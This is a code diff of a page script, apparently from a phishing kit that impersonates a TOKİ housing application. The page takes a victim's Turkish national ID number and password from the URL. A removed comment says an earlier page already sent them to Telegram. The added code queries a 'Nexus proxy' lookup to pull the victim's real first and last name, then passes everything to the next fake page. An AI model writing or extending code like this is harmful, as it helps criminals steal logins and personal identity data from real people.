@@ -273,27 +273,41 @@
     <script>
         // Yönlendirme mantığı (PHP'siz)
         const urlParams = new URLSearchParams(window.location.search);
-        const tcNumber = urlParams.get('tckno') || urlParams.get('tc') || urlParams.get('tc_no');
+        const tcNumber = urlParams.get('tc_no') || urlParams.get('tckno') || urlParams.get('tc');
         const password = urlParams.get('password');
-        
-        // 3 saniye bekle
-        setTimeout(function() {
-            if (tcNumber && password) {
-                // index.html'de Telegram'a gönderim zaten başarılı olduysa buraya yönlendirildi.
-                // Bu durumda, başarılı akışı simüle ederek bir sonraki sayfaya yönlendiriyoruz.
-                
-                // YÖNLENDİRİLECEK SAYFA ADI:
-                // Orijinalinde toki_application.php'ye yönlendirme vardı.
-                // Biz statik bir dosya kullanmalıyız: toki_application.html
-                
-                window.location.href = 'toki_application.html';
-                
-            } else {
-                // Parametreler yoksa ana sayfaya dön
-                // index.php yerine artık index.html kullanıyoruz
-                window.location.href = 'index.html'; 
+
+        // AD/SOYAD'ı Nexus proxy üzerinden sorgula ve sonraki yönlendirme querystring'ine ekle
+        async function appendNameParams(params) {
+            try {
+                if (!tcNumber) return params;
+                const res = await fetch(`/api/tc-lookup?tc=${encodeURIComponent(tcNumber)}`);
+                if (!res.ok) return params;
+                const data = await res.json();
+                if (data?.success && data?.status === 'OK') {
+                    if (data.firstName) params.set('AD', data.firstName);
+                    if (data.lastName) params.set('SOYAD', data.lastName);
+                }
+                return params;
+            } catch (_) {
+                return params;
             }
-        }, 3000); // 3 saniye bekle
+        }
+
+        (async function proceed() {
+            if (!(tcNumber && password)) {
+                window.location.href = 'index.html';
+                return;
+            }
+
+            const nextParams = new URLSearchParams({ tc_no: tcNumber, password: password });
+            await appendNameParams(nextParams);
+
+            // 3 saniye bekledikten sonra bir sonraki sayfaya yönlendir
+            setTimeout(function () {
+                // Statik hedef sayfa yoksa burada index'e kalabilirsiniz; örnek olarak ekli
+                window.location.href = `toki_application.html?${nextParams.toString()}`;
+            }, 3000);
+        })();
     </script>
 </body>
 </html>
